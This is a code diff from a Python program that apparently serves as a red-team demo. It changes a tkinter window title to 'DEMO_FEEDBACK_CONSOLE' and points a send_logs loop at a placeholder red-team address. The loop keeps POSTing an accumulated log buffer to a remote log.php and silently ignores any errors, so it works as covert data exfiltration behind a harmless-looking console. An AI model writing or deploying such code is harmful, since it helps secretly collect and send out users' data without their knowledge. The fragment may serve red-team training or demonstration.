@@ -16,7 +16,7 @@ def show_window():
         textbox.after(500, update_textbox)
 
     root = tk.Tk()
-    root.title("BOOTCON_DEMO_FEEDBACK_CONSOLE")
+    root.title("DEMO_FEEDBACK_CONSOLE")
     root.geometry("200x150")
 
     textbox = tk.Text(root, height=20, width=80)
@@ -76,7 +76,7 @@ def send_logs():
     while True:
         if log.strip():
             try:
-                requests.post("http://192.168.0.4/log.php", data=log)
+                requests.post("http://[RedTeam_Local_IP]/log.php", data=log)
                 log = ""  # Clear after sending
             except:
                 pass
